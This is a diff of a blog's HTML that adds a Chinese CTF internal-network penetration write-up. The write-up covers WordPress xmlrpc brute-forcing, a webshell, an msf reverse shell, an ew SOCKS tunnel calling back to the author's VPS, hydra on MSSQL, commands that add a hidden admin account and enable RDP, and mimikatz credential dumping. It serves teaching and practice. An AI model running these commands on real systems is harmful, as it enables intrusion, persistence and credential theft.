@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>Fidcer&#39;Blog</title>
+    <title>CTF内网渗透题 · Fidcer&#39;Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,12 +203,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Fidcer&#39;Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">CTF内网渗透题</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>Fidcer'Blog</a>
 </header>
@@ -220,24 +231,68 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            CTF内网渗透题
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">591</span>阅读时长: <span class="post-count reading-time">2 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/10/15</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -338,90 +393,85 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/10/15/内网渗透/" >
-            
-                <span>CTF内网渗透题</span>
-        </a>
-        <div class="abstract-content">
-            
-记一次CTF内网渗透，据说是从护网复现过来的。
+            <main class="main post-page">
+    <article class="article-entry">
+        <blockquote>
+<p>记一次CTF内网渗透，据说是从护网复现过来的。</p>
+</blockquote>
+<p><code>这是第一个flag。。。</code><br><a href="http://118.126.66.150/image/T5FR" target="_blank" rel="noopener"><img src="http://118.126.66.150/images/2019/10/11/a.md.png" alt="a.md.png"></a><br>既然我们知道这是wordpress正常套路那我们通过<code>wpscan</code>扫描一下</p>
+<hr>
+<p>如下图发现存在xmlrpc.php，根据经验这个php存在用户密码爆破，那我们尝试一下<br>参考：<a href="https://medium.com/@the.bilal.rizwan/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32" target="_blank" rel="noopener">Wordpress xmlrpc.php -common vulnerabilites &amp; how to exploit them</a><br><a href="http://118.126.66.150/image/Tlyx" target="_blank" rel="noopener"><img src="http://118.126.66.150/images/2019/10/11/QQ20191012000758.png" alt="QQ20191012000758.png"></a></p>
+<p>通过文章发布的地方知道存在一个power_admin的用户<br><a href="http://118.126.66.150/image/TDYf" target="_blank" rel="noopener"><img src="http://118.126.66.150/images/2019/10/11/SWYT13G1LF0YTM8V3M9A.png" alt="SWYT13G1LF0YTM8V3M9A.png"></a><br>通过<code>xmlrpc.php</code>验证一下<br><a href="http://118.126.66.150/image/TJhH" target="_blank" rel="noopener"><img src="http://118.126.66.150/images/2019/10/11/HFT3U203JYN_0GXU0X7.md.png" alt="HFT3U203JYN_0GXU0X7.md.png"></a><br>不知道为什么是不是我个人问题输入正确账号密码后没有直接给我跳转到wp-admin/index.php页面还是在原来页面。我只能通过替换cookie后直接访问。<br><a href="http://118.126.66.150/image/ThrC" target="_blank" rel="noopener"><img src="http://118.126.66.150/images/2019/10/11/NC85I4XP14RYQZOMYHK.md.png" alt="NC85I4XP14RYQZOMYHK.md.png"></a><br>在媒体库内直接上传冰蝎一句话后访问正常操作<br><a href="http://118.126.66.150/image/TuIa" target="_blank" rel="noopener"><img src="http://118.126.66.150/images/2019/10/11/9219XMTIHPMKF937Y.png" alt="9219XMTIHPMKF937Y.png"></a><br>之后通过冰蝎配合msf反弹shell<br><a href="http://118.126.66.150/image/T9vS" target="_blank" rel="noopener"><img src="http://118.126.66.150/images/2019/10/11/1E42VR__1LT_7UMYS6E.png" alt="1E42VR__1LT_7UMYS6E.png"></a></p>
+<p>内网穿透我比较常用的手法是通过ew配合proxychains<br><a href="https://zhuanlan.zhihu.com/p/32822159" target="_blank" rel="noopener">如何通过EW做Socks5代理进行内网渗透 - 知乎</a><br>ew for linux下载地址：<a href="http://118.126.66.150/ew_for_linux64" target="_blank" rel="noopener">ew</a></p>
+<hr>
+<p>首先在公网的vps上通过ew监听1080和1024<br><code>./ew_for_linux64 -s rcsocks -l 1080 -e 1024 &amp;</code><br>之后通过msf把ew客户端上传到靶机上</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload /root/ew/ew_for_linux64 /tmp/</span><br><span class="line">[*] uploading  : /root/ew/ew_for_linux64 -&gt; /tmp/</span><br><span class="line">[*] uploaded   : /root/ew/ew_for_linux64 -&gt; /tmp//ew_for_linux64</span><br><span class="line">meterpreter &gt; </span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 20657 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">cd /tmp</span><br><span class="line">chmod 777 ew_for_linux64</span><br><span class="line">./ew_for_linux64 -s rssocks -d 118.126.66.150 -e 1024</span><br></pre></td></tr></table></figure>
 
-这是第一个flag。。。既然我们知道这是wordpress正常套路那我们通过wpscan扫描一下
+<p>在配置一下本地kali的proxychains<br>编辑<code>/etc/proxychains.conf</code>,在最下面一行修改为公网vps的地址和端口<br><a href="http://118.126.66.150/image/TAEj" target="_blank" rel="noopener"><img src="http://118.126.66.150/images/2019/10/11/K5Y013PSU5M83UBVBXPV.png" alt="K5Y013PSU5M83UBVBXPV.png"></a><br>正确配置后就可愉快的探索内网了，如下图通过<code>proxychains nmap -sT 192.168.1.2 -Pn</code>扫描1.2主机的端口，这里我就不扫描内网了可以通过msf的模块扫描，我这里是直接通过在webshell然后使用ping方式获取到这台主机的。<br><a href="http://118.126.66.150/image/TCWP" target="_blank" rel="noopener"><img src="http://118.126.66.150/images/2019/10/11/3ZNZLFWSSM47GFEU2O.png" alt="3ZNZLFWSSM47GFEU2O.png"></a><br>发现存在1433端口通过hydra爆破密码，我前面已经爆破过了所以知道密码是123456演示一下，hydra命令我就不解释了看下help文档就会了。<br><a href="http://118.126.66.150/image/Ttnr" target="_blank" rel="noopener"><img src="http://118.126.66.150/images/2019/10/11/0W970XQWF9T7WQWXJGN2E.md.png" alt="0W970XQWF9T7WQWXJGN2E.md.png"></a><br>通过<code>proxychains msfconsole</code>使用<code>use auxiliary/admin/mssql/mssql_exec</code>模块执行命令<br><a href="http://118.126.66.150/image/Tbt1" target="_blank" rel="noopener"><img src="http://118.126.66.150/images/2019/10/11/QQ20191012010458.png" alt="QQ20191012010458.png"></a><br>添加账户设置管理员，开启3389</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user 1111 abc.123 /add</span><br><span class="line">net localgroup administrators 1111 /add</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
 
-如下图发现存在xmlrpc.php，根据经验这个php存在用户密码爆破，那我们尝试一下参考：Wordpress xmlrpc.php -common vulnerabilites &amp; how to exploit them
-通过文章发布的地方知道存在一个power_admin的用户通过xmlrpc.php验证一下不知道为什么是不是我个人问题输入正确账号密码后没有直接给我跳转到wp-admin/index.php页面还是在原来页面。...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/15</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
+<p><a href="http://118.126.66.150/image/Tx3G" target="_blank" rel="noopener"><img src="http://118.126.66.150/images/2019/10/11/NY5_FWI1V_B79CBEDMU.png" alt="NY5_FWI1V_B79CBEDMU.png"></a><br>现在可以通过rdesktop直接访问<br><a href="http://118.126.66.150/image/TwYO" target="_blank" rel="noopener"><img src="http://118.126.66.150/images/2019/10/11/HTE8Q1ILEEY59JQ0_V2.png" alt="HTE8Q1ILEEY59JQ0_V2.png"></a><br>上传神奇mimikz！！获取管理员密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p><a href="http://118.126.66.150/image/TErc" target="_blank" rel="noopener"><img src="http://118.126.66.150/images/2019/10/11/BKJXCL2EW5SSLEMFR.png" alt="BKJXCL2EW5SSLEMFR.png"></a></p>
+<p><a href="http://118.126.66.150/image/TBjp" target="_blank" rel="noopener"><img src="http://118.126.66.150/images/2019/10/11/YWY4ZGBZMJEAMOVV7O.png" alt="YWY4ZGBZMJEAMOVV7O.png"></a></p>
+<p>还有一台主机通过密码flag3{xxxx}账号administrator直接远程桌面连接即可</p>
+
     </article>
+    <!-- license  -->
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/10/14/10-1/" >
-            
-                <span>武夷山之旅</span>
-        </a>
-        <div class="abstract-content">
-            asd
-
-
-
-
-
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://vuln.top">Fidcer</a>
+            <p>原文链接：<a href="https://vuln.top/2019/10/15/内网渗透/">https://vuln.top/2019/10/15/内网渗透/</a>
+            <p>发表日期：<a href="https://vuln.top/2019/10/15/内网渗透/">October 15th 2019, 10:20:22 am</a>
+            <p>更新日期：<a href="https://vuln.top/2019/10/15/内网渗透/">October 15th 2019, 10:20:22 am</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/14</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2019/10/10/137/" >
-            
-                <span>豌豆杯入学ctf</span>
-        </a>
-        <div class="abstract-content">
-            Welcome to my blog, enter password to read.
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/10</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/10/14/10-1/" title= "武夷山之旅">
+                    <div class="prevTitle">武夷山之旅</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="comment"></div>
+    <script>
+    new Valine({
+        el: '#comment' ,
+        notify:false, 
+        verify:false, 
+        appId: "6XhAA8UYlSuUryATGQAXQF2W-gzGzoHsz",
+        appKey: "o2VWWVUNYF9c96lsP9ESfhvp",
+        placeholder: "ヾﾉ≧∀≦)o来啊，快活啊!",
+        path:window.location.pathname, 
+        avatar:'mm' 
+    });
+    </script>
+
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -503,6 +553,24 @@
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1251,6 +1319,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
